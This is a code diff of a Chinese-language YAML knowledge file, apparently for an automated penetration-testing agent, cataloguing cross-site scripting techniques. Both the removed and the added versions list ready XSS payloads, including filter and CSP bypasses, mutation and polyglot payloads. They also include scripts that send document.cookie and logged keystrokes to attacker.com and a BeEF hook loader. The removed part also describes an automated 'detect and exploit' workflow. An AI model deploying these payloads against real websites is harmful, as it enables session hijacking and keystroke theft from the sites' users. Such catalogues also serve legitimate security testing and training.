@@ -1,215 +1,28 @@
-name: "跨站脚本攻击"
-description: "反射型、存储型、DOM型XSS攻击技术"
-domain: "web"
-version: "1.0"
+name: 跨站脚本攻击
+description: 反射型、存储型、DOM型XSS攻击技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - xss
-  - javascript
-
-knowledge: |
-  # XSS详细分类
-  
-  ## 1. 反射型XSS (Reflected XSS)
-  
-  ### 基础Payload
-  
-  ```html
-  <script>alert(1)</script>
-  <img src=x onerror=alert(1)>
-  <svg onload=alert(1)>
-  <body onload=alert(1)>
-  <input onfocus=alert(1) autofocus>
-  <iframe src=javascript:alert(1)>
-  ```
-  
-  ### 探测
-  
-  ```
-  搜索框: "><script>alert(1)</script>
-  URL参数: ?q=<script>alert(1)</script>
-  ```
-  
-  ---
-  
-  ## 2. 存储型XSS (Stored XSS)
-  
-  同反射型XSS，但payload会存储在服务器端
-  
-  ### 常见存储点
-  
-  - 评论区
-  - 用户资料
-  - 帖子内容
-  - 头像名称
-  - 文件名
-  
-  ---
-  
-  ## 3. DOM型XSS (DOM-based XSS)
-  
-  ### 基础Payload
-  
-  ```javascript
-  <img src=x onerror=alert(document.domain)>
-  <svg onload=alert(location.href)>
-  <a href=javascript:alert(1)>click</a>
-  ```
-  
-  ### DOM Sink
-  
-  - document.write()
-  - innerHTML
-  - eval()
-  - setTimeout()
-  - location.href
-  
-  ---
-  
-  ## 4. 突变型XSS (mXSS)
-  
-  利用浏览器解析差异
-  
-  ```html
-  <svg><p><style><img src=x onerror=alert(1)>
-  <noscript><p title="</noscript><img src=x onerror=alert(1)>">
-  ```
-  
-  ---
-  
-  ## 5. Unicode XSS
-  
-  ```html
-  <img src=x onerror=alert(\u0031)>
-  <script>\u0061lert(1)</script>
-  ```
-  
-  ---
-  
-  ## 6. CSP绕过
-  
-  ### base标签
-  
-  ```html
-  <base href="http://attacker.com/">
-  ```
-  
-  ### meta标签
-  
-  ```html
-  <meta http-equiv="refresh" content="0;url=http://attacker.com/">
-  ```
-  
-  ### link标签
-  
-  ```html
-  <link rel="import" href="http://attacker.com/">
-  ```
-  
-  ### JSONP绕过
-  
-  ```html
-  <script src="http://target.com/jsonp?callback=alert(1)"></script>
-  ```
-  
-  ---
-  
-  ## 7. 过滤器绕过
-  
-  ### 大小写混淆
-  
-  ```html
-  <ScRiPt>alert(1)</sCrIpT>
-  ```
-  
-  ### HTML编码
-  
-  ```html
-  &lt;script&gt;alert(1)&lt;/script&gt;
-  ```
-  
-  ### URL编码
-  
-  ```html
-  %3Cscript%3Ealert(1)%3C/script%3E
-  ```
-  
-  ### 标签混淆
-  
-  ```html
-  <script/x>alert(1)</script>
-  <img src=x onerror=alert(1)>
-  ```
-  
-  ---
-  
-  ## 8. 编码绕过
-  
-  ### Base64
-  
-  ```html
-  <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-  ```
-  
-  ---
-  
-  ## 9. Polyglot XSS
-  
-  ```javascript
-  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
-  ```
-  
-  ---
-  
-  ## 10. Cookie窃取
-  
-  ```html
-  <script>
-  new Image().src="http://attacker.com/steal?c="+document.cookie;
-  </script>
-  ```
-  
-  ---
-  
-  ## 11. 键盘记录
-  
-  ```html
-  <script>
-  document.onkeypress=function(e){
-    new Image().src="http://attacker.com/log?k="+e.key;
-  }
-  </script>
-  ```
-  
-  ---
-  
-  ## 12. BeEF利用
-  
-  ```html
-  <script src="http://attacker.com:3000/hook.js"></script>
-  ```
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- xss
+- javascript
+knowledge: "# XSS详细分类\n\n## 1. 反射型XSS (Reflected XSS)\n\n### 基础Payload\n\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n\
+  <svg onload=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<iframe src=javascript:alert(1)>\n```\n\
+  \n### 探测\n\n```\n搜索框: \"><script>alert(1)</script>\nURL参数: ?q=<script>alert(1)</script>\n```\n\n---\n\n## 2. 存储型XSS (Stored\
+  \ XSS)\n\n同反射型XSS，但payload会存储在服务器端\n\n### 常见存储点\n\n- 评论区\n- 用户资料\n- 帖子内容\n- 头像名称\n- 文件名\n\n---\n\n## 3. DOM型XSS (DOM-based\
+  \ XSS)\n\n### 基础Payload\n\n```javascript\n<img src=x onerror=alert(document.domain)>\n<svg onload=alert(location.href)>\n\
+  <a href=javascript:alert(1)>click</a>\n```\n\n### DOM Sink\n\n- document.write()\n- innerHTML\n- eval()\n- setTimeout()\n\
+  - location.href\n\n---\n\n## 4. 突变型XSS (mXSS)\n\n利用浏览器解析差异\n\n```html\n<svg><p><style><img src=x onerror=alert(1)>\n<noscript><p\
+  \ title=\"</noscript><img src=x onerror=alert(1)>\">\n```\n\n---\n\n## 5. Unicode XSS\n\n```html\n<img src=x onerror=alert(\\\
+  u0031)>\n<script>\\u0061lert(1)</script>\n```\n\n---\n\n## 6. CSP绕过\n\n### base标签\n\n```html\n<base href=\"http://attacker.com/\"\
+  >\n```\n\n### meta标签\n\n```html\n<meta http-equiv=\"refresh\" content=\"0;url=http://attacker.com/\">\n```\n\n### link标签\n\
+  \n```html\n<link rel=\"import\" href=\"http://attacker.com/\">\n```\n\n### JSONP绕过\n\n```html\n<script src=\"http://target.com/jsonp?callback=alert(1)\"\
+  ></script>\n```\n\n---\n\n## 7. 过滤器绕过\n\n### 大小写混淆\n\n```html\n<ScRiPt>alert(1)</sCrIpT>\n```\n\n### HTML编码\n\n```html\n\
+  &lt;script&gt;alert(1)&lt;/script&gt;\n```\n\n### URL编码\n\n```html\n%3Cscript%3Ealert(1)%3C/script%3E\n```\n\n### 标签混淆\n\
+  \n```html\n<script/x>alert(1)</script>\n<img src=x onerror=alert(1)>\n```\n\n---\n\n## 8. 编码绕过\n\n### Base64\n\n```html\n\
+  <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\n```\n\n---\n\n## 9. Polyglot XSS\n\n```javascript\n\
+  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n```\n\
+  \n---\n\n## 10. Cookie窃取\n\n```html\n<script>\nnew Image().src=\"http://attacker.com/steal?c=\"+document.cookie;\n</script>\n\
+  ```\n\n---\n\n## 11. 键盘记录\n\n```html\n<script>\ndocument.onkeypress=function(e){\n  new Image().src=\"http://attacker.com/log?k=\"\
+  +e.key;\n}\n</script>\n```\n\n---\n\n## 12. BeEF利用\n\n```html\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n\
+  ```\n"
